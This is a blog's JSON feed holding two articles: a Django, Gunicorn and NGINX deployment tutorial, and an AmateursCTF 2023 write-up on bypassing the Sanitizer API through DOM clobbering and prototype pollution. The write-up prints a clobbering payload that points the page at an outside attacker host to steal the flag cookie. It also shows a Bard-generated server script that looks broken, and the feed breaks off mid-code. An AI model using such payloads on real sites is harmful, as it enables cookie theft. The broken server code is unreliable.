{"version":"https://jsonfeed.org/version/1.1","title":"./khatta.sh","home_page_url":"https://blog.shameerkashif.me","feed_url":"https://blog.shameerkashif.me/feed.json","description":"Khatta is a knowledge base and is created to provide in depth articles regarding tech, CTFs, challenges and much more.","icon":"https://blog.shameerkashif.me/assets/any@512.png","favicon":"https://blog.shameerkashif.me/favicon.png","authors":[{"name":"@hash3liZer","url":"https://blog.shameerkashif.me","avatar":"/assets/avatar.png"}],"language":"zh","hubs":[{"type":"WebSub","url":"https://pubsubhubbub.appspot.com"},{"type":"WebSub","url":"https://bridgy-fed.superfeedr.com"}],"items":[{"id":"blog/2023/deploy-django-website-nginx-gunicorn-ubuntu-22","url":"https://blog.shameerkashif.me/blog/2023/deploy-django-website-nginx-gunicorn-ubuntu-22","title":"Deploy a Django Application on Ubuntu 22.04 with Gunicorn & NGINX","content_html":"<h2 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h2><p>Hi, its been a while since i wrote something on my blog. Today, i am going to write about the process of deployment of a django application on a Ubuntu 22.02 live server. I’ll try to cover as much details as i can and mention about the common issues i normally faces while following the process. This article is also a kind of reminder for myself for the tutorials and blog that i followed and the issues i ran into. So, we are going to cover this deployment process through <strong>Gunicorn</strong>, <strong>NGINX</strong> and optionally using <strong>Postgresql</strong> database. </p><h2 id=\"tutorial\"><a href=\"#tutorial\">Tutorial</a></h2><p>So, without wasting any further time. Lets jump right into the details. </p><h3 id=\"pre-reqs\"><a href=\"#pre-reqs\">Pre-Reqs</a></h3><p>The foremost thing are the pre-reqs that we need to follow this tutorial. First is a server with a public IP. Many of you who are reading this might already have one before moving one. Well, if you don’t you can simply get one from any of the hosting services or Cloud platforms. Personally, i use <strong>DigitalOcean</strong> or <strong>AWS</strong> most of the time. And also, for the sake of this tutorial i’ll be using a <code>t2.micro</code> instance of EC2 service from AWS. </p><p>But in general what you need is an online server with <strong>Ubuntu 22.04</strong> installed and with publicly accessibly ports. Thi should also work just fine with Ubuntu 20.04. Let me know in comments if someone tests it. </p><h3 id=\"installing-packages\"><a href=\"#installing-packages\">Installing Packages</a></h3><p>First, lets update our <strong>ubuntu</strong> machine and install the required packages: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>sudo apt update</div><div class='line'>sudo apt install -y nginx python3 python3-dev python3-pip python3-virtualenv libpq-dev postgresql postgresql-contrib</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/5796e18f-36ee-4cb5-bd9c-7a8398627981\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Before going forward, lets escalate to the <code>root</code> shell as we might run into the permission issues again and again. And don’t worry, we will see the project and permissions of the other files at the last: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>sudo -s</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/be2a19b9-c46a-4a72-b70f-dbb0446dd33c\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"setting-up-project-directory\"><a href=\"#setting-up-project-directory\">Setting up Project Directory</a></h3><p>Now, lets move to the <code>/var/www/</code> directory where we are going to place our project folder. I am going to setup a project from scratch for demo purposes using <code>django-admin</code> command. But if you already have one, make sure its uploaded correctly. I normally used <code>rsync</code> for this: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>rsync -arvz -e 'ssh -p &lt;port-number&gt;' --progress --delete /path/to/local/folder user@remote-server:/var/www/</div></code></div></pre><!-- HTML_TAG_END --><p>For now, i will setup a new project from scratch and name it <code>myweb</code>. Lets install django and initialize an empty project: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>cd /var/www</div><div class='line'>pip3 install django</div><div class='line'>django-admin startproject myweb</div></code></div></pre><!-- HTML_TAG_END --><p>Move to <code>myweb</code> and initialize new <em>virtual environment</em>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>cd myweb/</div><div class='line'>virtualenv venv</div></code></div></pre><!-- HTML_TAG_END --><p>Moving forward, activate the virtual environment and install all the necessary packages that you might have placed in <code>requirements.txt</code>. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>source ./venv/bin/activate</div><div class='line'>pip3 install -r requirements.txt     # In case you have one</div><div class='line'>pip3 install django gunicorn psycopg2-binary</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"setting-up-postgres-database\"><a href=\"#setting-up-postgres-database\">Setting up Postgres (Database)</a></h3><p>You could move forward without this step if you are planning on using some other database or the default sqlite. But please note that you will have to install the relevant packages for that. While in this case, i am only focusing on <code>postgres</code>. </p><p>Launch <code>postgres</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>sudo -u postgres psql</div></code></div></pre><!-- HTML_TAG_END --><p>The next steps are supposed to be inside the <code>postgres</code> terminal. Create a new database. I am naming it <code>hashbase</code>. Setup a new user and assign it to the database that we just created: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>CREATE DATABASE hashbase;</div><div class='line'>CREATE USER hashbaseuser WITH PASSWORD 'password1122';</div><div class='line'>GRANT ALL PRIVILEGES ON DATABASE hashbase TO hashbaseuser;</div></code></div></pre><!-- HTML_TAG_END --><p>Next, we will modify a couple of our database settings for better processing and django functions: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>ALTER ROLE hashbaseuser SET client_encoding TO 'utf8';</div><div class='line'>ALTER ROLE hashbaseuser SET default_transaction_isolation TO 'read committed';</div><div class='line'>ALTER ROLE hashbaseuser SET timezone TO 'UTC';</div></code></div></pre><!-- HTML_TAG_END --><p>Quit:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>q</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/a450e21a-dfbe-4122-986f-8b5dc9e5c284\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"project-settings\"><a href=\"#project-settings\">Project Settings</a></h3><p>We will look at the project settings now that needs to be replaced or modified. Considering we are in the project directory located at <code>/var/www/myweb</code>. Lets edit the <code>settings.py</code> file: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>nano myweb/settings.py</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/3f6ad510-3443-4499-90ba-2ef8098d0989\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Edit the <code>ALLOWED_HOSTS</code> list variable to include all the <strong>IPs</strong> or <strong>Hostnames</strong> that you plan on using for the website. In here, i am simply going to put the <strong>PUBLIC IP</strong> of the server i am on. You can put domain names if you are going to configure one with the website. </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>...</div><div class='line'></div><div class='line'>ALLOWED_HOSTS = [</div><div class='line'>  '13.229.230.156',      # Public IP of the Server</div><div class='line'>  'mydomain.com',        # In case you have a domain, you can skip the IP Address</div><div class='line'>  'someotherhostetc',</div><div class='line'>]</div><div class='line'></div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>Now, move a bit below to this and find the <code>DATABASES</code> variable section. By default it is configured to use <code>sqlite3</code> as its database. We will change the settings to use <code>postgresql</code>: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>...</div><div class='line'></div><div class='line'>DATABASES = &#123;</div><div class='line'>    'default': &#123;</div><div class='line'>        'ENGINE': 'django.db.backends.postgresql_psycopg2',</div><div class='line'>        'NAME': 'hashbase',</div><div class='line'>        'USER': 'hashbaseuser',</div><div class='line'>        'PASSWORD': 'password1122',</div><div class='line'>        'HOST': 'localhost',</div><div class='line'>        'PORT': '',</div><div class='line'>    &#125;</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>After this, we need to setup a <code>static</code> and <code>media</code> directory where our project static files are going to be stored. The <code>media</code> folder will contain files that are supposed to be uploaded by the user of the application. So, again in the <code>settings.py</code> file, move at the end of the file and find the line <code>STATIC_URL = &#39;static/&#39;</code> and add some new content below it: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>...</div><div class='line'></div><div class='line'>STATIC_URL = 'static/'</div><div class='line'>STATIC_ROOT = BASE_DIR / 'public'</div><div class='line'>MEDIA_URL  = 'media/'</div><div class='line'>MEDIA_ROOT = BASE_DIR / 'media'</div><div class='line'></div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>The <code>STATIC_ROOT</code> defines the folder where the public content like <em>css,js or imgs</em> are going to be stored upon running the <code>collectstatic</code> command on <code>manage.py</code> file. Please note that its totally different from the <code>STATICFILES_DIRS</code> variable which is used to define the directories to locate static files. Think of <code>STATIC_ROOT</code> as more of a <strong>production</strong> specific variable. </p><h3 id=\"spin-up-the-project\"><a href=\"#spin-up-the-project\">Spin up the Project</a></h3><p>Lets move towards spinning up the project for the public. For that, we will do the normal django commands like migrations and super user. </p><p>Run migrations and create a superuser: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>python3 manage.py makemigrations</div><div class='line'>python3 manage.py migrate</div><div class='line'>python3 manage.py createsuperuser     # Enter your credentials for the superuser when prompted</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/bf41701c-c35d-448e-adbc-ff111a9ef7e6\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>After this, we will run the <code>collectstatic</code> command to locate all the static files we have in our project and put them to the folder that we defined at <code>STATIC_ROOT</code> variable. These static files will be served by the <code>nginx</code> server and not from django like we see during the development.</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>python3 manage.py collectstatic</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/a79e25e0-5960-4cd5-ab97-f359cc2de470\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>You can now execute the <code>runserver</code> command on public interface to see your website. Before also make sure nginx is not using the port <code>80</code> by default: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>service nginx stop</div><div class='line'>python3 manage.py runserver 0.0.0.0:80</div></code></div></pre><!-- HTML_TAG_END --><p>Now, if you access your website at port <code>80</code> you would be able to see your project:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>http://PUBLCI_IP_ADDRESS</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/f1bea206-f36f-4df3-8448-f5b2824587c1\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Finally, back in the <code>settings.py</code> put the <code>DEBUG</code> value to <code>False</code>. You can keep it enabled if you are going to debug the project or facing some other issue. But make sure to put the value to <code>False</code> for the production cases:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>nano myweb/settings.py</div><div class='line'></div><div class='line'>...</div><div class='line'>DEBUG = False</div><div class='line'>...</div></code></div></pre><!-- HTML_TAG_END --><p>At this point, we have our project all ok. But this is not how we are going to host the website actually. </p><h3 id=\"setting-up-gunicorn\"><a href=\"#setting-up-gunicorn\">Setting up Gunicorn</a></h3><p>Gunicorn is the server service that we are going to configure with <code>nginx</code> for the public. We will configure a new <code>systemd</code> service for this. But before, we will test if <code>gunicorn</code> is really working or not. So, simply bind gunicorn to the <code>0.0.0.0</code> and test if we can access the website at port <code>80</code> like we did before. Note that we are still inside <code>/var/www/myweb</code> directory</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>gunicorn --bind 0.0.0.0:80 myweb.wsgi</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/8c4e703d-fcf7-4658-b358-1addaa74f6fb\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Fire up <code>nano</code> again for the gunicorn service and do the configuration: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>nano /etc/systemd/system/gunicorn.service</div></code></div></pre><!-- HTML_TAG_END --><p>Inside the file. I’ll not get into much details of what is happening here. But you can refer to the <code>systemd</code> documentation for more in depth detail. However, we will review the <code>Service</code> section here:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>[Unit]</div><div class='line'>Description=gunicorn daemon</div><div class='line'>After=network.target</div><div class='line'></div><div class='line'>[Service]</div><div class='line'>User=www-data</div><div class='line'>Group=www-data</div><div class='line'>WorkingDirectory=/var/www/myweb</div><div class='line'>ExecStart=/var/www/myweb/venv/bin/gunicorn --access-logfile - --workers 3 --timeout 300 --bind unix:/var/www/myweb/myweb.sock myweb.wsgi:application</div><div class='line'></div><div class='line'>[Install]</div><div class='line'>WantedBy=multi-user.target</div></code></div></pre><!-- HTML_TAG_END --><p>The <code>User</code> and <code>Group</code> defines the privileges the command is going to be executed with. The complete command is specified with <code>ExecStart</code> variable. Make sure to specify <code>WorkingDirectory</code> as well. Otherwise, gunicorn wouldn’t be able to locate the <code>myweb.wsgi</code> on path. Save the file.</p><p>Make sure to change the project’s owner before starting gunicorn: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>chown www-data:www-data -R /var/www/myweb</div></code></div></pre><!-- HTML_TAG_END --><p>Start the service after saving and make that its running and doesn’t have any errors. If there are errors, you will need to fix them before moving forward: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>systemctl daemon-reload</div><div class='line'>systemctl restart gunicorn.service</div><div class='line'>systemctl status gunicorn.service</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/4f2ca54a-e633-4593-86f1-a292d4e899e6\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>You can see more detailed logs of gunicorn if there are errors using: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>sudo journalctl -u gunicorn</div></code></div></pre><!-- HTML_TAG_END --><h3 id=\"setting-up-nginx\"><a href=\"#setting-up-nginx\">Setting UP NGINX</a></h3><p>This is the last step. We will configure <code>nginx</code> which in short is the public server and will take requests from the public and forward it to gunicorn as a reverse proxy. Remove the default enabled nginx website and create a new <code>nginx</code> project file:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" bash=\"true\"><div class=\"language-id\">bash</div><div class='code-container'><code><div class='line'>rm /etc/nginx/sites-enabled/default</div><div class='line'>nano /etc/nginx/sites-available/myweb</div></code></div></pre><!-- HTML_TAG_END --><p>Inside the file, configure your web server: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" nginx=\"true\"><div class=\"language-id\">nginx</div><div class='code-container'><code><div class='line'>server &#123;</div><div class='line'>    listen 80;</div><div class='line'>    server_name DOMAIN_OR_PUBLIC_IP;</div><div class='line'></div><div class='line'>    location = /favicon.ico &#123; access_log off; log_not_found off; &#125;</div><div class='line'>    location /static/ &#123;</div><div class='line'>        alias /var/www/myweb/public/;</div><div class='line'>        add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;</div><div class='line'>    &#125;</div><div class='line'></div><div class='line'>    location /media/ &#123;</div><div class='line'>        alias /var/www/myweb/media/;</div><div class='line'>    &#125;</div><div class='line'></div><div class='line'>    location / &#123;</div><div class='line'>        include proxy_params;</div><div class='line'>        add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;</div><div class='line'>        proxy_pass http://unix:/var/www/myweb/myweb.sock;</div><div class='line'>    &#125;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>In the above configuration, make sure you have changed it according to your requirements. One thing to look out for is the <code>server_name</code> directive. If you are working with a domain name, make sure to replace it correctly. Another thing would be the paths that are mentioned in the configuration. Make sure all of the mentioned paths in your correct according to your settings. </p><p>Save the file and enable this nginx project by creating its soft link at <code>sites-enabled</code> directory: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>ln -s /etc/nginx/sites-available/myweb /etc/nginx/sites-enabled/myweb</div></code></div></pre><!-- HTML_TAG_END --><p>Check nginx configuration and restart nginx: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>nginx -t</div><div class='line'>systemctl restart nginx</div><div class='line'>systemctl status nginx</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/bbab172e-0279-4ac6-a274-1fa9181530da\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>If everything goes correctly, you should be able to see the nginx service running and if you visit the <strong>PUBLIC IP</strong> or <strong>Domain Name</strong> now, you will see your website. For the final test, visit the <code>/admin</code> page to make sure the static files are also served correctly from our nginx service: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>http://PUBLIC_IP_ADDRESS_OR_DOMAIN/admin</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/f3b0c7d0-3dff-40fd-b17f-4a22f280cc09\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>In case your static are not served properly, you can check the <code>nginx</code> error logs at: <code>/var/log/nginx/error.log</code> and debug the issues. </p><h2 id=\"conclusion\"><a href=\"#conclusion\">Conclusion</a></h2><p>Thanks for making it through. All in all, we saw how to host a django website using gunicorn, nginx and postgresql. Its not very tricky but yes sometimes debugging the configuration files can take time. So, while doing your own, make sure to double check your configuration files and make sure that they are making sense for what they are supposed to do. </p>","summary":"A Detailed walkthrough of the process of deploying a django application on a ubuntu server from scratch. This guide covers the deployment stages with Gunicorn, NGINX and Postgresql.","image":"https://github.com/hash3liZer/khatta/assets/29171692/ed7dd92d-f7d1-4646-9194-e02102945392","date_published":"2023-09-11T00:00:00.000Z","date_modified":"2023-10-29T16:18:54.402Z","tags":["django","deployment","development","drf","python","ubuntu"],"_indieweb":{"type":"article"}},{"id":"blog/2023/amateursctf-web-2023-writeup-sanity","url":"https://blog.shameerkashif.me/blog/2023/amateursctf-web-2023-writeup-sanity","title":"Web Sanity Writeup AmateursCTF 2023 DOM Clobbering and Prototype Pollution","content_html":"<h2 id=\"introduction\"><a href=\"#introduction\">Introduction</a></h2><p>In the AmateursCTF 2023, there was a challenge by the name <code>Sanity</code>. Now, i wasn’t able to solve the challenge within the due time as i got stuck on the very last step of my Proof of Concept. Neverthless, i feel like writing the writeup for this one. This challenge got me hooked up for quite some time.  </p><h2 id=\"surface\"><a href=\"#surface\">Surface</a></h2><p>We were given 2 files: <code>index.js</code> and <code>sanes.ejs</code>. The former is ofcourse the execution file which we are going launch and the other file is being parsed on the way to show the input we are going to enter. The <code>index.js</code> file was calling puppeteer which is a headless browser like selenium. The browser was visiting the server created by the script, attaching the cookie which contained the <code>flag</code> and the visiting the sanes page created when we submitted the data. In index.js where the flag was being attached: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>...</div><div class='line'></div><div class='line'>app.get(\"/report/:sane\", async (req, res) =&gt; &#123;</div><div class='line'>  let ctx;</div><div class='line'>  try &#123;</div><div class='line'>    ctx = await (await browser).createIncognitoBrowserContext();</div><div class='line'>    const visit = async (browser, sane) =&gt; &#123;</div><div class='line'>      const page = await browser.newPage();</div><div class='line'>      await page.goto(\"http://localhost:3000\");</div><div class='line'>      await page.setCookie(&#123; name: \"flag\", value: process.env.FLAG &#125;);</div><div class='line'>      await page.goto(&#96;http://localhost:3000/$&#123;sane&#125;&#96;);</div><div class='line'>      await page.waitForNetworkIdle(&#123; timeout: 5000 &#125;);</div><div class='line'>      await page.close();</div><div class='line'>    &#125;;</div><div class='line'></div><div class='line'>...</div><div class='line'></div><div class='line'>// sanes.ejs file being parsed from the output</div><div class='line'>app.get(\"/:sane\", (req, res) =&gt; &#123;</div><div class='line'>  const sane = sanes.get(req.params.sane);</div><div class='line'>  if (!sane) return res.status(404).send(\"not found\");</div><div class='line'></div><div class='line'>  res.render(\"sanes\", &#123;</div><div class='line'>    id: req.params.sane,</div><div class='line'>    title: encodeURIComponent(sane.title),</div><div class='line'>    body: encodeURIComponent(sane.body),</div><div class='line'>  &#125;);</div><div class='line'>&#125;);</div></code></div></pre><!-- HTML_TAG_END --><p>Moving towards the template file, the template was using sanitizer API. Lets review the template file first: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;body&gt;</div><div class='line'>    &lt;h1 id=\"title\"&gt;</div><div class='line'>        &lt;script&gt;</div><div class='line'>            const sanitizer = new Sanitizer();   &lt;!-- This is whee the sanitizer API is being installed --&gt;</div><div class='line'>            document.getElementById(\"title\").setHTML(decodeURIComponent(&#96;&lt;%- title %&gt;&#96;), &#123; sanitizer &#125;);</div><div class='line'>        &lt;/script&gt;</div><div class='line'>    &lt;/h1&gt;</div><div class='line'>    &lt;div id=\"paste\"&gt;</div><div class='line'>        &lt;script&gt;</div><div class='line'>            class Debug &#123;</div><div class='line'>                #sanitize;</div><div class='line'>                constructor(sanitize = true) &#123;</div><div class='line'>                    this.#sanitize = sanitize</div><div class='line'>                &#125;</div><div class='line'></div><div class='line'>                get sanitize() &#123;</div><div class='line'>                    return this.#sanitize;</div><div class='line'>                &#125;</div><div class='line'>            &#125;</div><div class='line'></div><div class='line'>            async function loadBody() &#123;</div><div class='line'>                &lt;! -- VULNERABLE CODE --&gt;</div><div class='line'>                let extension = null;</div><div class='line'>                if (window.debug?.extension) &#123;</div><div class='line'>                    let res = await fetch(window.debug?.extension.toString());</div><div class='line'>                    extension = await res.json();</div><div class='line'>                &#125;</div><div class='line'></div><div class='line'>                const debug = Object.assign(new Debug(true), extension ?? &#123; report: true &#125;);</div><div class='line'>                &lt;!-- VULNERABLE CODE --&gt;</div><div class='line'>                let body = decodeURIComponent(&#96;&lt;%- body %&gt;&#96;);</div><div class='line'>                if (debug.report) &#123;</div><div class='line'>                    const reportLink = document.createElement(\"a\");</div><div class='line'>                    reportLink.innerHTML = &#96;Report &lt;%= id %&gt;&#96;;</div><div class='line'>                    reportLink.href = &#96;report/&lt;%= id %&gt;&#96;;</div><div class='line'>                    reportLink.style.marginTop = \"1rem\";</div><div class='line'>                    reportLink.style.display = \"block\"</div><div class='line'></div><div class='line'>                    document.body.appendChild(reportLink)</div><div class='line'>                &#125;</div><div class='line'></div><div class='line'>                &lt;!-- EXECUTION POINT --&gt;</div><div class='line'>                if (debug.sanitize) &#123;</div><div class='line'>                    document.getElementById(\"paste\").setHTML(body, &#123; sanitizer &#125;)</div><div class='line'>                &#125; else &#123;</div><div class='line'>                    document.getElementById(\"paste\").innerHTML = body</div><div class='line'>                &#125;</div><div class='line'>            &#125;</div><div class='line'></div><div class='line'>            loadBody();</div><div class='line'>        &lt;/script&gt;</div><div class='line'>    &lt;/div&gt;</div><div class='line'></div><div class='line'>&lt;/body&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>As we can see in the above code, we have an interesting line where the javascript was checking for <code>debug.sanitize</code> property and if its false, the data was passed without any sanitization. Moreover, if we move a little above from this statement, we find our actual target. The following code: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>let extension = null;</div><div class='line'>if (window.debug?.extension) &#123;</div><div class='line'>    let res = await fetch(window.debug?.extension.toString());</div><div class='line'>    extension = await res.json();</div><div class='line'>&#125;</div><div class='line'></div><div class='line'>const debug = Object.assign(new Debug(true), extension ?? &#123; report: true &#125;);</div></code></div></pre><!-- HTML_TAG_END --><p>What exactly is happening here inside the if condition, the control is checking if the <code>debug.extension</code> parameter on windows object exists or not. If it does, fetch the value from URL and pass it to our next statement where we are passing the properties of 2 different javascript objects to another. There are 2 possible vulnerabilities that can be exploited here to gain XSS by bypassing the sanitizer API: </p><ul><li>DOM Clobbering</li><li>Prototype Pollution</li></ul><h2 id=\"behind-the-scenes\"><a href=\"#behind-the-scenes\">Behind the Scenes</a></h2><p>First things first, i normally work with Firefox but Sanitizer API gave me <code>undefined</code> error. So, i moved to chrome considering that <code>puppeteer</code> also uses chromium. </p><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/fbd6557c-4b5a-4955-8d12-f6e261f983e0\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Before moving forward, i’d another problem in mind about the <code>Debug</code> class. Inside the class we have: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" javascript=\"true\"><div class=\"language-id\">javascript</div><div class='code-container'><code><div class='line'>class Debug &#123;</div><div class='line'>    #sanitize;</div><div class='line'>    constructor(sanitize = true) &#123;</div><div class='line'>        this.#sanitize = sanitize</div><div class='line'>    &#125;</div><div class='line'></div><div class='line'>    get sanitize() &#123;</div><div class='line'>        return this.#sanitize;</div><div class='line'>    &#125;</div><div class='line'>&#125;</div></code></div></pre><!-- HTML_TAG_END --><p>The class parameter initialized is a private member. The problem here is i can’t override the prameter value even with prototype pollution because its a private member. Neverthless, whats important is that default value is nothing and hence if during the exploitation, i would skip this parameter, then the <code>debug.sanitize</code> should resolve to <code>undefined</code> in the execution code condition. Well, now its a theory, so moving forward. </p><h3 id=\"dom-clobbering\"><a href=\"#dom-clobbering\">DOM Clobbering</a></h3><p>The milestone is to initialize a <code>debug</code> parameter on browser windows object. </p><p>With DOM Clobbering, if we give <code>id</code> to an element, the element is then initialized on browser’s <code>window</code> object. I started with a simple <code>div</code> tag in the <code>Name Your Rant</code> field: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;div id=\"debug\"&gt;&lt;/div&gt;</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/6362e084-0a44-493c-9c0a-a6f9878f3283\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><p>Good enough, we got the html element. But now how to get the <code>extension</code> property on this element. I almost spend hours searching for this. Anyways, the following payload seems to give the html element as the string:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" html=\"true\"><div class=\"language-id\">html</div><div class='code-container'><code><div class='line'>&lt;div id=\"debug\"&gt;&lt;/div&gt;&lt;div id=\"debug\" name=\"extension\" href=\"http://payload.shameerkashif.me\"&gt;&lt;/div&gt;</div></code></div></pre><!-- HTML_TAG_END --><p>If we are to use the <code>anchor</code> tag instead of <code>div</code> tag, we will get the URL in return. So, our first part would look like: </p><!-- HTML_TAG_START --><pre class=\"shiki material-default\"><div class='code-container'><code><div class='line'>&lt;a id=\"debug\"&gt;&lt;/a&gt;&lt;a id=\"debug\" name=\"extension\" href=\"http://payload.shameerkashif.me\"&gt;&lt;/a&gt;</div></code></div></pre><!-- HTML_TAG_END --><p><img src=\"https://github.com/hash3liZer/khatta/assets/29171692/d1df6d24-3879-437a-b167-00d66f6c7345\" alt=\"image\" class=\"rounded-lg my-2\" loading=\"lazy\" decoding=\"async\"></p><h3 id=\"attacker-server\"><a href=\"#attacker-server\">Attacker Server</a></h3><p>Here’s the code that i generated using <code>bard</code>:</p><!-- HTML_TAG_START --><pre class=\"shiki material-default\" python=\"true\"><div class=\"language-id\">python</div><div class='code-container'><code><div class='line'>import http.server</div><div class='line'>import json</div><div class='line'></div><div class='line'>def handle_request(request):</div><div class='line'>    response = &#123;\"message\": \"Hello, world!\"&#125;</div><div class='line'>    response_headers = &#123;\"Access-Control-Allow-Origin\": \"*\"&#125;</div><div class='line'>    return http.server.SimpleHTTPRequestHandler._set_headers(</div><div class='line'>        request, response, response_headers</div><div class='line'>    )</div><div class='line'></div><div class='line'>server = http.server.HTTPServer(('', 8000), handle_request)</div><div class='line'>server.serve_forever()</div><div 